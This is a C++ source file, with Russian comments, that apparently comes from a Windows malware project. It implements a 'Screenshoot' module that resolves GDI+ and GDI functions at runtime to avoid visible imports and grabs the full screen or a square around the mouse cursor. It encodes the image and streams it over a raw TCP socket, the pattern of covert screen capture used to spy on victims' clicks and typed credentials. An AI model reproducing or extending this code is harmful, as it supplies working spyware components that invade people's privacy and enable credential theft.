#include <windows.h>
#include <objbase.h>
#include <gdiplus.h>
#include <shlwapi.h>
#include <ws2tcpip.h>

#include "defines.h"
#include "screenshot.h"

#include "..\common\mem.h"
#include "..\common\debug.h"
#include "..\common\gui.h"
#include "..\common\wsocket.h"

//Список прототипов испортируемых функций.
typedef Gdiplus::GpStatus (WINGDIPAPI *GDIPLUSSTARTUP)(ULONG_PTR *token, const Gdiplus::GdiplusStartupInput *input, Gdiplus::GdiplusStartupOutput *output);
typedef void     (WINGDIPAPI *GDIPLUSSHUTDOWN)(ULONG_PTR token);
typedef Gdiplus::GpStatus (WINGDIPAPI *GDIPCREATEBITMAPFROMHBITMAP)(HBITMAP hbm, HPALETTE hpal, Gdiplus::GpBitmap** bitmap);
typedef Gdiplus::GpStatus (WINGDIPAPI *GDIPDISPOSEIMAGE)(Gdiplus::GpImage *image);
typedef Gdiplus::GpStatus (WINGDIPAPI *GDIPGETIMAGEENCODERSSIZE)(UINT *numEncoders, UINT *size);
typedef Gdiplus::GpStatus (WINGDIPAPI *GDIPGETIMAGEENCODERS)(UINT numEncoders, UINT size, Gdiplus::ImageCodecInfo *encoders);
typedef Gdiplus::GpStatus (WINGDIPAPI *GDIPSAVEIMAGETOSTREAM)(Gdiplus::GpImage *image, IStream* stream, GDIPCONST CLSID* clsidEncoder, GDIPCONST Gdiplus::EncoderParameters* encoderParams);

typedef HRESULT (WINAPI *CREATESTREAMONHGLOBAL)(HGLOBAL hGlobal, BOOL fDeleteOnRelease, LPSTREAM* ppstm);
typedef HDC     (WINAPI *CREATEDCW)(LPCWSTR lpszDriver, LPCWSTR lpszDevice, LPCWSTR lpszOutput, CONST DEVMODE* lpInitData);
typedef HDC     (WINAPI *CREATECOMPATIBLEDC)(HDC hdc);
typedef HBITMAP (WINAPI *CREATECOMPATIBLEBITMAP)(HDC hdc, int nWidth, int nHeight);
typedef int     (WINAPI *GETDEVICECAPS)(HDC hdc, int nIndex);
typedef HGDIOBJ (WINAPI *SELECTOBJECT)(HDC hdc, HGDIOBJ hgdiobj);
typedef BOOL    (WINAPI *BITBLT)(HDC hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, HDC hdcSrc, int nXSrc, int nYSrc, DWORD dwRop);
typedef BOOL    (WINAPI *DELETEOBJECT)(HGDIOBJ hObject);
typedef BOOL    (WINAPI *DELETEDC)(HDC hdc);

void Screenshoot::init(void)
{

}

void Screenshoot::uninit(void)
{

}

IStream *Screenshoot::_screenToIStream(LPWSTR mimeType, DWORD quality, WORD rectSize)
{
  static const GUID encoderQuality    = {0x1d5be4b5, 0xfa4a, 0x452d, 0x9c, 0xdd, 0x5d, 0xb3, 0x51, 0x05, 0xe7, 0xeb};
  static const GUID encoderColorDepth = {0x66087055, 0xad66, 0x4c7c, 0x9a, 0x18, 0x38, 0xa2, 0x31, 0x0b, 0x83, 0x37};

  IStream *stream    = NULL;
  HMODULE gdiPlusDll = NULL;
  HMODULE ole32Dll   = NULL;
  HMODULE gdi32Dll   = NULL;
  Gdiplus::GdiplusStartupInput startupInput;
  ULONG_PTR token;

  //Загрузка gdiplus.dll.
  gdiPlusDll = CWA(kernel32, LoadLibraryA)("gdiplus.dll");
  GDIPLUSSTARTUP              gpStartup                 = (GDIPLUSSTARTUP)CWA(kernel32, GetProcAddress)(gdiPlusDll,              "GdiplusStartup");
  GDIPLUSSHUTDOWN             gpShutdown                = (GDIPLUSSHUTDOWN)CWA(kernel32, GetProcAddress)(gdiPlusDll,             "GdiplusShutdown");
  GDIPCREATEBITMAPFROMHBITMAP gpCreateBitmapFromHBitmap = (GDIPCREATEBITMAPFROMHBITMAP)CWA(kernel32, GetProcAddress)(gdiPlusDll, "GdipCreateBitmapFromHBITMAP");
  GDIPDISPOSEIMAGE            gpDisposeImage            = (GDIPDISPOSEIMAGE)CWA(kernel32, GetProcAddress)(gdiPlusDll,            "GdipDisposeImage");
  GDIPGETIMAGEENCODERSSIZE    gpGetImageEncodersSize    = (GDIPGETIMAGEENCODERSSIZE)CWA(kernel32, GetProcAddress)(gdiPlusDll,    "GdipGetImageEncodersSize");
  GDIPGETIMAGEENCODERS        gpGetImageEncoders        = (GDIPGETIMAGEENCODERS)CWA(kernel32, GetProcAddress)(gdiPlusDll,        "GdipGetImageEncoders");
  GDIPSAVEIMAGETOSTREAM       gpSaveImageToStream       = (GDIPSAVEIMAGETOSTREAM)CWA(kernel32, GetProcAddress)(gdiPlusDll,       "GdipSaveImageToStream");
  if(gpStartup == NULL || gpShutdown == NULL|| gpCreateBitmapFromHBitmap == NULL || gpDisposeImage == NULL || gpGetImageEncodersSize == NULL || gpGetImageEncoders == NULL || gpSaveImageToStream == NULL)
  {
    WDEBUG0(WDDT_ERROR, "Failed to load gdiplus.dll.");
    goto END;
  }

  //Загрузка ole32.dll.
  ole32Dll = CWA(kernel32, LoadLibraryA)("ole32.dll");
  CREATESTREAMONHGLOBAL createStreamOnHGlobal = (CREATESTREAMONHGLOBAL)CWA(kernel32, GetProcAddress)(ole32Dll, "CreateStreamOnHGlobal");
  if(createStreamOnHGlobal == NULL)
  {
    WDEBUG0(WDDT_ERROR, "Failed to load ole32.dll.");
    goto END;
  }
  
  //Загрузка gdi32.dll.
  gdi32Dll = CWA(kernel32, LoadLibraryA)("gdi32.dll");
  CREATEDCW              createDcW              = (CREATEDCW)CWA(kernel32, GetProcAddress)(gdi32Dll,              "CreateDCW");
  CREATECOMPATIBLEDC     createCompatibleDC     = (CREATECOMPATIBLEDC)CWA(kernel32, GetProcAddress)(gdi32Dll,     "CreateCompatibleDC");
  CREATECOMPATIBLEBITMAP createCompatibleBitmap = (CREATECOMPATIBLEBITMAP)CWA(kernel32, GetProcAddress)(gdi32Dll, "CreateCompatibleBitmap");
  GETDEVICECAPS          getDeviceCaps          = (GETDEVICECAPS)CWA(kernel32, GetProcAddress)(gdi32Dll,          "GetDeviceCaps");
  SELECTOBJECT           selectObject           = (SELECTOBJECT)CWA(kernel32, GetProcAddress)(gdi32Dll,           "SelectObject");
  BITBLT                 bitBlt                 = (BITBLT)CWA(kernel32, GetProcAddress)(gdi32Dll,                 "BitBlt");
  DELETEOBJECT           deleteObject           = (DELETEOBJECT)CWA(kernel32, GetProcAddress)(gdi32Dll,           "DeleteObject");
  DELETEDC               deleteDc               = (DELETEDC)CWA(kernel32, GetProcAddress)(gdi32Dll,               "DeleteDC");
  if(createDcW == NULL || createCompatibleDC == NULL || createCompatibleBitmap == NULL || getDeviceCaps == NULL || selectObject == NULL || bitBlt == NULL || deleteObject == NULL || deleteDc == NULL)
  {
    WDEBUG0(WDDT_ERROR, "Failed to load gdi32.dll.");
    goto END;
  }

  //////////////////////////////////////////////////////////////////////////////////////////////////
  // Инициализация
  //////////////////////////////////////////////////////////////////////////////////////////////////

  startupInput.GdiplusVersion = 1;
  startupInput.DebugEventCallback       = NULL;
  startupInput.SuppressBackgroundThread = FALSE;
  startupInput.SuppressExternalCodecs   = FALSE;

  if(gpStartup(&token, &startupInput, NULL) == Gdiplus::Ok)
  {
    HDC dc = createDcW(L"DISPLAY", NULL, NULL, NULL);
    if(dc != NULL)
    {
      HDC memDc = createCompatibleDC(dc);
      if(memDc != NULL)
      {
        //Загружаем данные курсора.
        POINT cursorPos;
        ICONINFO cursorInfo;
        HCURSOR cursor = Gui::_loadSharedCursor(NULL, MAKEINTRESOURCEW(OCR_NORMAL));
        if(cursor != NULL && (CWA(user32, GetIconInfo)(cursor, &cursorInfo) == FALSE || CWA(user32, GetCursorPos)(&cursorPos) == FALSE))cursor = NULL;
        if(cursor == NULL)rectSize = 0; //Переходим в режим рисования всего скрина.
        
        //Получем размер изображения.
        int width, height;
        if(rectSize != 0)
        {
          width  = rectSize;
          height = rectSize;
        }
        else
        {
          width  = getDeviceCaps(dc, HORZRES);
          height = getDeviceCaps(dc, VERTRES);
        }
        
        //Создаем изображение.
        HBITMAP bitmap = createCompatibleBitmap(dc, width, height);
        if(bitmap != NULL)
        {
          HBITMAP oldBitmap = (HBITMAP)selectObject(memDc, bitmap);
          if(oldBitmap != NULL)
          {
            //Копируем изображение.
            int x = 0, y = 0;
            if(rectSize != 0)
            {
              if((x = cursorPos.x - rectSize / 2) < 0)x = 0;
              if((y = cursorPos.y - rectSize / 2) < 0)y = 0;
              if((cursorPos.x -= x) < 0)cursorPos.x = 0;
              if((cursorPos.y -= y) < 0)cursorPos.y = 0;
            }

            if(bitBlt(memDc, 0, 0, width, height, dc, x, y, SRCCOPY | CAPTUREBLT) != FALSE)
            {
              //Рисуем курсор.
              if(cursor != NULL)
              {
                if((x = cursorPos.x - cursorInfo.xHotspot) < 0)x = 0;
                if((y = cursorPos.y - cursorInfo.yHotspot) < 0)y = 0;
                CWA(user32, DrawIcon)(memDc, x, y, cursor);
              }

              //Конвертируем в Stream.
              Gdiplus::GpBitmap *gpBitmap = NULL;
              if(gpCreateBitmapFromHBitmap(bitmap, NULL, &gpBitmap) == Gdiplus::Ok && gpBitmap != NULL)
              {
                //Поиск нужного кодека.
                UINT countOfEncoders = 0;
                UINT sizeOfEncoders  = 0;
                Gdiplus::ImageCodecInfo* imageCodecInfo;
                
                if(gpGetImageEncodersSize(&countOfEncoders, &sizeOfEncoders) == Gdiplus::Ok &&
                   sizeOfEncoders != 0 &&
                   countOfEncoders != 0 &&
                   (imageCodecInfo = (Gdiplus::ImageCodecInfo *)Mem::alloc(sizeOfEncoders)) != NULL)
                {
                  CLSID encoderClsid;
                  if(gpGetImageEncoders(countOfEncoders, sizeOfEncoders, imageCodecInfo) == Gdiplus::Ok)
                  {
                    for(UINT i = 0; i < countOfEncoders; i++)if(CWA(kernel32, lstrcmpiW)(mimeType, imageCodecInfo[i].MimeType) == 0)
                    {
                      Mem::_copy(&encoderClsid, &imageCodecInfo[i].Clsid, sizeof(CLSID));
                      countOfEncoders = 0;
                      break;
                    }
                  }
                  Mem::free(imageCodecInfo);

                  //Кодек найден.
                  if(countOfEncoders == 0 && createStreamOnHGlobal(NULL, TRUE, &stream) == S_OK && stream != NULL)
                  {
                    //Опции Кодека
                    Gdiplus::EncoderParameters params;
                    params.Count = 0;

                    //Качество картинки
                    if(quality > 0)
                    {
                      Mem::_copy(&params.Parameter[params.Count].Guid, &encoderQuality, sizeof(GUID));
                      params.Parameter[params.Count].Type           = Gdiplus::EncoderParameterValueTypeLong;
                      params.Parameter[params.Count].NumberOfValues = 1;
                      params.Parameter[params.Count].Value          = &quality;
                      params.Count++;
                    }

                    //Сохраняем.
                    if(gpSaveImageToStream(gpBitmap, stream, &encoderClsid, &params) != Gdiplus::Ok)
                    {
                      stream->Release();
                      stream = NULL;
                    }
                    else
                    {
                      //Финал.
                      LARGE_INTEGER li;
                      li.HighPart = 0;
                      li.LowPart  = 0;
                      stream->Seek(li, STREAM_SEEK_SET, NULL);
                    }
                  }
                }
                gpDisposeImage(gpBitmap);
              }
            }
            selectObject(memDc, oldBitmap);
          }
          deleteObject(bitmap);
        }
        deleteDc(memDc);
      }
      deleteDc(dc);
    }
    gpShutdown(token);
  }

END:
  if(gdiPlusDll != NULL)CWA(kernel32, FreeLibrary)(gdiPlusDll);
  if(ole32Dll != NULL)CWA(kernel32, FreeLibrary)(ole32Dll);
  if(gdi32Dll != NULL)CWA(kernel32, FreeLibrary)(gdi32Dll);
  
  return stream;
}

bool Screenshoot::_screenToSocket(SOCKET s, LPWSTR mimeType, DWORD quality, WORD rect)
{
  bool retVal = false;
  IStream *stream = Screenshoot::_screenToIStream(mimeType, quality, rect);
  if(stream != NULL)
  {
    STATSTG ss;
    if(stream->Stat(&ss, STATFLAG_NONAME) == S_OK && ss.cbSize.HighPart == 0)
    {
      LPBYTE buf = (LPBYTE)Mem::alloc(sizeof(DWORD) + ss.cbSize.LowPart);
      if(buf != NULL)
      {
        if(stream->Read(buf + sizeof(DWORD), ss.cbSize.LowPart, &ss.cbSize.LowPart) == S_OK)
        {
          *((LPDWORD)buf) = ss.cbSize.LowPart;
          retVal = WSocket::tcpSend(s, buf, sizeof(DWORD) + ss.cbSize.LowPart);
        }
        Mem::free(buf);
      }
    }
    stream->Release();
  }

  if(retVal == false)
  {
    DWORD size = 0;
    WSocket::tcpSend(s, &size, sizeof(DWORD));
  }

  return retVal;
}
